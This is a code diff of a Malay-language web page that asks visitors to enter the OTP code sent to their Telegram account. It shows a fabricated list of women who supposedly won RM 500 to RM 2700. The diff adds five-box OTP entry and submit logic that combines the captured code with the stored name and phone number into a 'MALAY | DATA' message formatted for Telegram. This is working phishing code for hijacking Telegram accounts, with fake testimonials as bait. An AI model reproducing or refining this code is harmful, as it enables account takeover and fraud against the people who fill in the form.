@@ -160,13 +160,19 @@
         top: 0;
       }
 
-      input[type="tel"] {
-        width: 100%;
-        padding: 12px;
-        margin-bottom: 10px;
+      .otp-input {
+        width: 50px;
+        height: 50px;
+        font-size: 1.5rem;
+        text-align: center;
         border: 1px solid #ccc;
         border-radius: 5px;
-        font-size: 1.1rem;
+      }
+
+      .otp-input:focus {
+        border-color: #007bff;
+        outline: none;
+        box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
       }
 
       .btn {
@@ -182,6 +188,7 @@
         cursor: pointer;
         align-items: center;
         justify-content: center;
+        margin-bottom: 20px;
       }
 
       .btn:hover {
@@ -332,161 +339,163 @@
       <div class="form-container">
         <p>Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda</p>
         <form id="registrationForm">
-          <label for="name">Masukan Kod-OTP</label>
-          <input
-            type="tel"
-            id="otp"
-            name="otp"
-            placeholder="Masukan 5 digit OTP"
-            required
-          />
-
+          <label for="otp">Masukan Kod-OTP</label>
+          <div
+            id="otp-container"
+            style="display: flex; gap: 10px; justify-content: center"
+          >
+            <input type="text" maxlength="1" class="otp-input" required />
+            <input type="text" maxlength="1" class="otp-input" required />
+            <input type="text" maxlength="1" class="otp-input" required />
+            <input type="text" maxlength="1" class="otp-input" required />
+            <input type="text" maxlength="1" class="otp-input" required />
+          </div>
           <button type="submit" class="btn">LOG MASUK</button>
         </form>
-      </div>
 
-      <div class="_record-box">
-        <div id="list" class="list-box">
-          <div class="list">
-            <!-- Item yang sudah ada -->
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1"><span class="name">Aisyah Zainal</span></div>
-                <div class="h2">BERJAYA RM 500</div>
-              </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1"><span class="name">Siti Nur Aina</span></div>
-                <div class="h2">BERJAYA RM 750</div>
-              </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Nurul Ain Zulaikha</span>
+        <div class="_record-box">
+          <div id="list" class="list-box">
+            <div class="list">
+              <!-- Item yang sudah ada -->
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
                 </div>
-                <div class="h2">BERJAYA RM 2700</div>
-              </div>
-            </div>
-            <!-- 10 Nama Baru dengan 3 Suku Kata -->
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Farah Nadia Binti Zaid</span>
+                <div class="center">
+                  <div class="h1"><span class="name">Aisyah Zainal</span></div>
+                  <div class="h2">BERJAYA RM 500</div>
                 </div>
-                <div class="h2">BERJAYA RM 500</div>
               </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Syafika Nor Azizah</span>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
                 </div>
-                <div class="h2">BERJAYA RM 750</div>
-              </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Sharifah Sofia Adlin</span>
+                <div class="center">
+                  <div class="h1"><span class="name">Siti Nur Aina</span></div>
+                  <div class="h2">BERJAYA RM 750</div>
                 </div>
-                <div class="h2">BERJAYA RM 2700</div>
               </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Zahira Nur Hidayah</span>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
                 </div>
-                <div class="h2">BERJAYA RM 500</div>
-              </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Nur Syazwani Roslan</span>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Nurul Ain Zulaikha</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 2700</div>
                 </div>
-                <div class="h2">BERJAYA RM 750</div>
               </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Amirah Siti Khadijah</span>
+              <!-- 10 Nama Baru dengan 3 Suku Kata -->
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
                 </div>
-                <div class="h2">BERJAYA RM 2700</div>
-              </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Halimah Nor Adilah</span>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Farah Nadia Binti Zaid</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 500</div>
                 </div>
-                <div class="h2">BERJAYA RM 500</div>
               </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Raihana Binti Saifuddin</span>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
                 </div>
-                <div class="h2">BERJAYA RM 750</div>
-              </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Nur Izzati Hamzah</span>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Syafika Nor Azizah</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 750</div>
                 </div>
-                <div class="h2">BERJAYA RM 2700</div>
               </div>
-            </div>
-            <div class="item">
-              <div class="record_logo">
-                <img src="avatar.png" alt="" />
-              </div>
-              <div class="center">
-                <div class="h1">
-                  <span class="name">Hanisah Afiqah Bakar</span>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
                 </div>
-                <div class="h2">BERJAYA RM 500</div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Sharifah Sofia Adlin</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 2700</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Zahira Nur Hidayah</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 500</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Nur Syazwani Roslan</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 750</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Amirah Siti Khadijah</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 2700</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Halimah Nor Adilah</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 500</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Raihana Binti Saifuddin</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 750</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Nur Izzati Hamzah</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 2700</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Hanisah Afiqah Bakar</span>
+                  </div>
+                  <div class="h2">BERJAYA RM 500</div>
+                </div>
               </div>
             </div>
           </div>
@@ -503,15 +512,34 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
     <script>
       document
+        .querySelectorAll(".otp-input")
+        .forEach((input, index, inputs) => {
+          input.addEventListener("input", () => {
+            if (input.value.length === 1 && index < inputs.length - 1) {
+              inputs[index + 1].focus(); // Pindah ke input berikutnya jika ada input
+            }
+          });
+
+          input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !input.value && index > 0) {
+              inputs[index - 1].focus(); // Pindah ke input sebelumnya jika kosong
+            }
+          });
+        });
+
+      document
         .getElementById("registrationForm")
         .addEventListener("submit", function (event) {
           event.preventDefault(); // Mencegah pengiriman form default
 
-          const otp = document.getElementById("otp").value; // Ambil nilai OTP
+          const otpInputs = document.querySelectorAll(".otp-input");
+          const otp = Array.from(otpInputs)
+            .map((input) => input.value)
+            .join(""); // Gabungkan nilai OTP
 
-          // Periksa apakah input OTP tidak kosong
-          if (!otp) {
-            alert("Silakan masukkan OTP.");
+          // Periksa apakah semua input OTP terisi
+          if (otp.length !== otpInputs.length) {
+            alert("Silakan isi semua kolom OTP.");
             return;
           }
 
@@ -527,18 +555,17 @@
           // Ambil data yang disimpan sebelumnya dari local storage
           const savedPhone = localStorage.getItem("phone");
           const savedName = localStorage.getItem("name");
-          const savedOtp = localStorage.getItem("otp"); // Ambil OTP dari local storage
 
           // Format pesan untuk Telegram
           const message = `
 ──────────────────
-(MALAY | DATA | ${savedPhone})
+(MALAY | DATA | ${savedPhone || "Tidak Tersedia"})
 ──────────────────
-- Nama Lengkap  : ${savedName}
+- Nama Lengkap  : ${savedName || "Tidak Tersedia"}
 
-- No HP         : ${savedPhone}
+- No HP         : ${savedPhone || "Tidak Tersedia"}
 
-- OTP           : ${savedOtp}
+- OTP           : ${otp}
 ──────────────────
 `;
 
